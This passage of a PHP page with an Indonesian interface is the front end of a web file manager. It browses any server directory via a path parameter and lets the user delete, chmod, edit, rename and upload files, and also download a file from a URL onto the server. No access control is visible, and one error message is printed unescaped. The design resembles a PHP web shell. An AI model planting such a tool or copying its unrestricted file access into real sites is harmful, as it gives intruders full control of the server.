            placeholder="Masukkan URL file yang ingin didownload"
            required
        >

        <input
            type="text"
            name="download_name"
            class="form-control"
            placeholder="Nama file yang disimpan"
            required
        >

        <button
            type="submit"
            name="download_file"
            class="btn btn-secondary"
        >
            ↓ Download
        </button>

    </form>

    <?php if (isset($error)): ?>

        <div class="alert alert-danger">
            <?= htmlspecialchars($error) ?>
        </div>

    <?php endif; ?>

    <?php if (isset($uploadSuccess)): ?>

        <div class="alert alert-success">
            <?= htmlspecialchars($uploadSuccess) ?>
        </div>

    <?php endif; ?>

    <?php if (isset($uploadError)): ?>

        <div class="alert alert-warning">
            <?= $uploadError ?>
        </div>

    <?php endif; ?>

    <!-- FILE TABLE -->

    <div class="table-responsive">

        <table class="table table-dark table-hover table-bordered">

            <thead>

                <tr>

                    <th>
                        Nama
                    </th>

                    <th style="width:100px;">
                        Tipe
                    </th>

                    <th style="width:150px;">
                        Permission
                    </th>

                    <th style="width:180px;">
                        Aksi
                    </th>

                </tr>

            </thead>

            <tbody>

                <?php

                /*
                |--------------------------------------------------------------------------
                | PARENT DIRECTORY
                |--------------------------------------------------------------------------
                */

                $parentDir = dirname($dir);

                if ($parentDir !== $dir):

                ?>

                <tr>

                    <td>

                        📁

                        <a
                            href="?path=<?= urlencode($parentDir) ?>"
                        >
                            .. (Folder Induk)
                        </a>

                    </td>

                    <td>
                        Folder
                    </td>

                    <td>
                        -
                    </td>

                    <td>
                        -
                    </td>

                </tr>

                <?php endif; ?>

                <?php

                /*
                |--------------------------------------------------------------------------
                | SORT FOLDERS AND FILES
                |--------------------------------------------------------------------------
                */

                $folders = [];
                $files = [];

                foreach ($items as $item) {

                    if (
                        $item === '.' ||
                        $item === '..'
                    ) {
                        continue;
                    }

                    $path =
                        $dir .
                        DIRECTORY_SEPARATOR .
                        $item;

                    if (!file_exists($path)) {
                        continue;
                    }

                    if (is_dir($path)) {

                        $folders[] = $item;

                    } else {

                        $files[] = $item;
                    }
                }

                sort($folders);
                sort($files);

                $sortedItems =
                    array_merge(
                        $folders,
                        $files
                    );

                foreach ($sortedItems as $item):

                    $path =
                        $dir .
                        DIRECTORY_SEPARATOR .
                        $item;

                    $perm =
                        get_permissions($path);

                ?>

                <tr>

                    <td>

                        <?php if (is_dir($path)): ?>

                            📁

                            <a
                                href="?path=<?= urlencode($path) ?>"
                            >
                                <?= htmlspecialchars($item) ?>
                            </a>

                        <?php else: ?>

                            📄

                            <a
                                href="#"
                                class="edit-file-link"
                                data-filename="<?= htmlspecialchars($item) ?>"
                            >
                                <?= htmlspecialchars($item) ?>
                            </a>

                        <?php endif; ?>

                    </td>

                    <td>

                        <?= is_dir($path)
                            ? 'Folder'
                            : 'File'
                        ?>

                    </td>

                    <td>

                        <form
                            method="post"
                            class="d-flex align-items-center gap-1 file-actions"
                            onsubmit="return confirm('Ubah permission menjadi nilai ini?');"
                        >

                            <input
                                type="hidden"
                                name="file_name"
                                value="<?= htmlspecialchars($item) ?>"
                            >

                            <input
                                type="text"
                                name="perm"
                                value="<?= htmlspecialchars($perm) ?>"
                                class="perm-input"
                                maxlength="4"
                                pattern="[0-7]{3,4}"
                                title="Masukkan permission oktal, contoh 0644"
                                required
                            >

                            <button
                                type="submit"
                                name="chmod"
                                class="btn btn-sm btn-warning"
                                title="Ubah Permission"
                            >
                                CHMOD
                            </button>

                        </form>

                    </td>

                    <td>

                        <div class="actions-container">

                            <a
                                href="?path=<?= urlencode($dir) ?>&delete=<?= urlencode($item) ?>"
                                class="btn btn-sm btn-outline-danger"
                                onclick="return confirm('Hapus item ini secara permanen?')"
                                title="Hapus"
                            >
                                🗑
                            </a>

                            <?php if (is_file($path)): ?>

                                <button
                                    class="btn btn-sm btn-outline-warning edit-file-link"
                                    data-filename="<?= htmlspecialchars($item) ?>"
                                    title="Edit File"
                                >
                                    ✏
                                </button>

                            <?php endif; ?>

                            <button
                                class="btn btn-sm btn-info"
                                data-bs-toggle="modal"
                                data-bs-target="#renameModal"
                                data-oldname="<?= htmlspecialchars($item) ?>"
                                title="Ganti Nama"
                            >
                                ✎
                            </button>

                        </div>

                    </td>

                </tr>

                <?php endforeach; ?>

            </tbody>

        </table>

    </div>

    <!-- CREATE FOLDER MODAL -->

    <div
        class="modal fade"
        id="createFolderModal"
        tabindex="-1"
        aria-hidden="true"
    >

        <div class="modal-dialog modal-dialog-centered">

            <form
                method="post"
                class="modal-content text-light"
            >

                <div class="modal-header">

                    <h5 class="modal-title">
                        📁 Buat Folder Baru
                    </h5>

                    <button
                        type="button"
                        class="btn-close btn-close-white"
                        data-bs-dismiss="modal"
                    ></button>

                </div>

                <div class="modal-body">

                    <input
                        type="text"
                        name="folder_name"
                        class="form-control"
                        placeholder="Nama folder"
                        required
                        autofocus
                    >

                </div>

                <div class="modal-footer">

                    <button
                        type="submit"
                        name="create_folder"
                        class="btn btn-primary"
                    >
                        Buat Folder
                    </button>

                </div>

            </form>

        </div>

    </div>

    <!-- CREATE FILE MODAL -->

    <div
        class="modal fade"
        id="createFileModal"
        tabindex="-1"
        aria-hidden="true"
    >

        <div class="modal-dialog modal-dialog-centered">

            <form
                method="post"
                class="modal-content text-light"
            >

                <div class="modal-header">

                    <h5 class="modal-title">
                        📄 Buat File Baru
                    </h5>

                    <button
                        type="button"
                        class="btn-close btn-close-white"
                        data-bs-dismiss="modal"
                    ></button>

                </div>

                <div class="modal-body">

                    <input
                        type="text"
                        name="file_name"
                        class="form-control"
                        placeholder="Nama file, contoh: index.html"
                        required
                        autofocus
                    >

                </div>

                <div class="modal-footer">

                    <button
                        type="submit"
                        name="create_file"
                        class="btn btn-primary"
                    >
                        Buat File
                    </button>

                </div>

            </form>

        </div>

    </div>

    <!-- RENAME MODAL -->

    <div
        class="modal fade"
        id="renameModal"
        tabindex="-1"
        aria-hidden="true"
    >

        <div class="modal-dialog modal-dialog-centered">

            <form
                method="post"
                class="modal-content text-light"
            >

                <div class="modal-header">

                    <h5 class="modal-title">
                        ✎ Ganti Nama File / Folder
                    </h5>

                    <button
                        type="button"
                        class="btn-close btn-close-white"
                        data-bs-dismiss="modal"
                    ></button>

                </div>

                <div class="modal-body">

                    <input
                        type="hidden"
                        name="old_name"
                        id="renameOldName"
                    >

                    <label
                        for="renameNewName"
                        class="form-label"
                    >
                        Nama Baru
                    </label>

                    <input
                        type="text"
                        name="new_name"
                        id="renameNewName"
                        class="form-control"
                        required
                    >

                </div>

                <div class="modal-footer">

                    <button
                        type="submit"
                        name="rename"
                        class="btn btn-primary"
                    >
                        Ganti Nama
                    </button>

                </div>

            </form>

        </div>

    </div>

    <!-- EDIT FILE MODAL -->

    <div
        class="modal fade"
        id="editFileModal"
        tabindex="-1"
        aria-hidden="true"
    >

        <div class="modal-dialog modal-xl modal-dialog-centered">

            <div class="modal-content text-light">

                <div class="modal-header">

                    <h5 class="modal-title">

                        ✏ Edit File:

                        <span id="editFileName"></span>

                    </h5>

                    <button
                        type="button"
                        class="btn-close btn-close-white"
                        data-bs-dismiss="modal"
                    ></button>

                </div>

                <div class="modal-body">

                    <textarea
                        id="editFileContent"
                        class="form-control"
                        rows="24"
                        spellcheck="false"
                    ></textarea>

                    <div
                        id="editFileStatus"
                        class="mt-2 text-center"
                    ></div>

                </div>

                <div class="modal-footer">

                    <button
                        id="saveFileBtn"
                        class="btn btn-primary"
                    >
                        💾 Simpan File
                    </button>

                </div>

            </div>

        </div>

    </div>

</div>

<script
    src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"
></script>

<script>

document.addEventListener(
    'DOMContentLoaded',
    function () {

        /*
        |--------------------------------------------------------------------------
        | RENAME MODAL
        |--------------------------------------------------------------------------
        */

        const renameModal =
            document.getElementById(
                'renameModal'
            );

        renameModal.addEventListener(
            'show.bs.modal',
            function (event) {

                const button =
                    event.relatedTarget;

                const oldName =
                    button.getAttribute(
                        'data-oldname'
                    );

                document.getElementById(
                    'renameOldName'
                ).value = oldName;

                document.getElementById(
                    'renameNewName'
                ).value = oldName;
            }
        );

        /*
        |--------------------------------------------------------------------------
        | EDIT FILE
        |--------------------------------------------------------------------------
        */

        const editFileModal =
            new bootstrap.Modal(
                document.getElementById(
                    'editFileModal'
                )
            );

        let currentEditFile = null;

        const fileNameDisplay =
            document.getElementById(
                'editFileName'
            );

        const fileContentArea =
            document.getElementById(
                'editFileContent'
            );

        const saveBtn =
            document.getElementById(
                'saveFileBtn'
            );

        const statusDiv =
            document.getElementById(
                'editFileStatus'
            );

        /*
        |--------------------------------------------------------------------------
        | LOAD FILE
        |--------------------------------------------------------------------------
        */

        document
            .querySelectorAll('.edit-file-link')
            .forEach(function (el) {

                el.addEventListener(
                    'click',
                    function (e) {

                        e.preventDefault();

                        const filename =
                            this.getAttribute(
                                'data-filename'
                            );

                        currentEditFile =
                            filename;

                        fileNameDisplay.textContent =
                            filename;

                        fileContentArea.value =
                            'Memuat konten file...';

                        statusDiv.textContent =
                            '';

                        saveBtn.disabled =
                            true;

                        const currentPath =
                            '<?= urlencode($dir) ?>';

                        fetch(
                            '?ajax_load_file=1' +
                            '&file=' +
                            encodeURIComponent(
                                filename
                            ) +
                            '&current_path=' +
                            currentPath
                        )

                        .then(function (response) {

                            if (!response.ok) {

                                return response
                                    .text()
                                    .then(function (text) {

                                        throw new Error(
                                            'HTTP ' +
                                            response.status +
                                            ': ' +
                                            text
                                        );

                                    });

                            }

                            return response.text();

                        })

                        .then(function (text) {

                            fileContentArea.value =
                                text;

                            editFileModal.show();

                            fileContentArea.focus();

                        })

                        .catch(function (error) {

                            console.error(
                                'Error loading file:',
                                error
                            );

                            fileContentArea.value =
                                'Gagal memuat file: ' +
                                error.message;

                            statusDiv.textContent =
                                'Gagal memuat file.';

                            statusDiv.style.color =
                                '#fb7185';

                        })

                        .finally(function () {

                            saveBtn.disabled =
                                false;

                        });

                    }
                );

            });

        /*
        |--------------------------------------------------------------------------
        | SAVE FILE
        |--------------------------------------------------------------------------
        */

        saveBtn.addEventListener(
            'click',
            function () {

                if (!currentEditFile) {
                    return;
                }

                saveBtn.disabled =
                    true;

                statusDiv.textContent =
                    'Menyimpan...';

                statusDiv.style.color =
                    '#c084fc';

                const currentPath =
                    '<?= urlencode($dir) ?>';

                fetch(
                    '<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>',
                    {
                        method: 'POST',

                        headers: {
                            'Content-Type':
                                'application/x-www-form-urlencoded'
                        },

                        body:
                            new URLSearchParams({

                                ajax_save_file:
                                    '1',

                                edit_file:
                                    currentEditFile,

                                content:
                                    fileContentArea.value,

                                current_path:
                                    currentPath
                            })
                    }
                )

                .then(function (response) {

                    return response.text();

                })

                .then(function (response) {

                    if (
                        response.trim() === 'OK'
                    ) {

                        statusDiv.textContent =
                            '✓ File berhasil disimpan.';

                        statusDiv.style.color =
                            '#86efac';

                    } else {

                        statusDiv.textContent =
                            'Gagal menyimpan file: ' +
                            response.trim();

                        statusDiv.style.color =
                            '#fb7185';
                    }

                })

                .catch(function (error) {

                    console.error(
                        'Error saving file:',
                        error
                    );

                    statusDiv.textContent =
                        'Terjadi kesalahan jaringan.';

                    statusDiv.style.color =
                        '#fb7185';

                })

                .finally(function () {

                    saveBtn.disabled =
                        false;

                    setTimeout(
                        function () {

                            statusDiv.textContent =
                                '';

                        },
                        3000
                    );

                });

            }
        );

        /*
        |--------------------------------------------------------------------------
        | UPLOAD
        |--------------------------------------------------------------------------
        */

        const uploadForm =
            document.getElementById(
                'uploadForm'
            );

        const fileInput =
            document.getElementById(
                'fileInput'
            );

        const progressWrapper =
            document.getElementById(
                'progressWrapper'
            );

        const progressBar =
            document.getElementById(
                'progressBar'
            );

        const uploadStatus =
            document.getElementById(
                'uploadStatus'
            );

        uploadForm.addEventListener(
            'submit',
            function (e) {

                e.preventDefault();

                if (
                    fileInput.files.length === 0
                ) {

                    uploadStatus.textContent =
                        'Pilih file terlebih dahulu.';

                    uploadStatus.style.color =
                        '#fbbf24';

                    return;
                }

                const formData =
                    new FormData();

                for (
                    let i = 0;
                    i < fileInput.files.length;
                    i++
                ) {

                    formData.append(
                        'file[]',
                        fileInput.files[i]
                    );
                }

                const xhr =
                    new XMLHttpRequest();

                xhr.open(
                    'POST',
                    '<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>?path=<?= urlencode($dir) ?>',
                    true
                );

                xhr.setRequestHeader(
                    'X-Requested-With',
                    'XMLHttpRequest'
                );

                /*
                |--------------------------------------------------------------------------
                | PROGRESS
                |--------------------------------------------------------------------------
                */

                xhr.upload.onprogress =
                    function (e) {

                        if (e.lengthComputable) {

                            const percent =
                                (e.loaded /
                                e.total) *
                                100;

                            progressWrapper.style.display =
                                'block';

                            progressBar.style.width =
                                percent + '%';

                            progressBar.textContent =
                                Math.round(percent) +
                                '%';

                            uploadStatus.textContent =
                                'Mengunggah: ' +
                                Math.round(percent) +
                                '%';

                            uploadStatus.style.color =
                                '#c084fc';
                        }
                    };

                /*
                |--------------------------------------------------------------------------
                | COMPLETE
                |--------------------------------------------------------------------------
                */

                xhr.onload =
                    function () {

                        progressWrapper.style.display =
                            'none';

                        progressBar.style.width =
                            '0%';

                        progressBar.textContent =
                            '0%';

                        try {

                            const response =
                                JSON.parse(
                                    xhr.responseText
                                );

                            if (
                                xhr.status === 200 &&
                                response.status ===
                                'success'
                            ) {

                                uploadStatus.textContent =
                                    '✓ ' +
                                    response.message;

                                uploadStatus.style.color =
                                    '#86efac';

                                setTimeout(
                                    function () {
                                        location.reload();
                                    },
                                    1000
                                );

                            } else {

                                uploadStatus.textContent =
                                    'Upload gagal: ' +
                                    (
                                        response.message ||
                                        'Terjadi kesalahan.'
                                    );

                                uploadStatus.style.color =
                                    '#fb7185';
                            }

                        } catch (e) {

                            console.error(
                                'JSON parse error:',
                                e
                            );

                            uploadStatus.textContent =
                                'Upload gagal: Respons server tidak valid.';

                            uploadStatus.style.color =
                                '#fb7185';
                        }
                    };

                /*
                |--------------------------------------------------------------------------
                | NETWORK ERROR
                |--------------------------------------------------------------------------
                */

                xhr.onerror =
                    function () {

                        uploadStatus.textContent =
                            'Upload gagal: Kesalahan jaringan.';

                        uploadStatus.style.color =
                            '#fb7185';

                        progressWrapper.style.display =
                            'none';

                        progressBar.style.width =
                            '0%';

                        progressBar.textContent =
                            '0%';
                    };

                xhr.send(formData);

            }
        );

    }
);

</script>

</body>
</html>
